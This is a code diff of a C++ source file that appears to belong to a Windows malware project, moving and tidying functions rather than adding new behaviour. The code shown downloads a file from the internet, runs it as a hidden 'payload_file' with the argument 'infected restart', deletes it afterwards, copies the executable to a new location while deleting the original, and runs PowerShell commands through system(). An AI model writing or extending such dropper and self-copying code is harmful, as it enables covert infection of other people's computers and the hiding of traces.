@@ -1,22 +1,5 @@
 #include "misc.h"
 
-void CallMessageBoxFromShell()
-{
-	SHELLEXECUTEINFO sei;
-	ZeroMemory(&sei, sizeof(SHELLEXECUTEINFO));
-	sei.cbSize = sizeof(SHELLEXECUTEINFO);
-	sei.lpVerb = "OPEN";
-	sei.lpFile = payload_file;
-	sei.lpParameters = "infected restart";
-	sei.nShow = SW_HIDE;
-	sei.fMask = SEE_MASK_NOCLOSEPROCESS;
-
-	ShellExecuteEx(&sei);
-	// Until messagebox.exe is closed
-	WaitForSingleObject(sei.hProcess, INFINITE);
-	TerminateProcess(sei.hProcess, 1);
-}
-
 bool isProcessRunning(string process_name)
 {
 	bool exists = false;
@@ -40,6 +23,33 @@ bool isProcessRunning(string process_name)
 	return exists;
 }
 
+void CallMessageBoxFromShell()
+{
+	SHELLEXECUTEINFO sei;
+	// fill address of sei with zeros
+	ZeroMemory(&sei, sizeof(SHELLEXECUTEINFO));
+	sei.cbSize = sizeof(SHELLEXECUTEINFO);
+	sei.lpVerb = "OPEN";
+	sei.lpFile = payload_file;
+	sei.lpParameters = "infected restart";
+	sei.nShow = SW_HIDE;
+	sei.fMask = SEE_MASK_NOCLOSEPROCESS;
+
+	ShellExecuteEx(&sei);
+	// Until messagebox.exe is closed
+	WaitForSingleObject(sei.hProcess, INFINITE);
+	TerminateProcess(sei.hProcess, 1);
+
+	// if process is terminated (false), then delete
+	if (!isProcessRunning(payload_file))
+	{
+		if (!DeleteFile(payload_file))
+		{
+			std::cout << GetLastError() << std::endl;
+		}
+	}
+}
+
 void CustomDeleteFile(const char* file)
 {
 	TCHAR szCmd[2 * MAX_PATH];
@@ -55,7 +65,7 @@ void CustomDeleteFile(const char* file)
 
 DWORD WINAPI sendThread(PVOID pv)
 {
-	while (1) 
+	while (1)
 	{
 		Sleep(1000 * 60 * 1); //one minute
 		std::cout << "Still copying." << std::endl;
@@ -76,7 +86,7 @@ void Misc::call_ps(string filename)
 	system(ps_cmd.c_str());
 }
 
-void Misc::CopyMyself() 
+void Misc::CopyMyself()
 {
 	char filename[MAX_PATH]; // declaring the executable as its own file
 
@@ -122,7 +132,7 @@ void Misc::CopyMyself()
 
 		// delete original file
 		string file_to_delete = current_working_directory() + "\\" + filename;
-		
+
 		if (DeleteFileA(file_to_delete.c_str()) != 0)
 		{
 			std::cout << "[+] Original file deleted." << std::endl;
@@ -167,14 +177,4 @@ void Misc::CallFileFromInternet()
 	InternetCloseHandle(hURL);
 
 	CallMessageBoxFromShell();
-
-	// if process is terminated (false), then delete
-	if (!isProcessRunning(payload_file))
-	{
-		if (!DeleteFile(payload_file))
-		{
-			std::cout << GetLastError() << std::endl;
-		}
-	}
 }
-
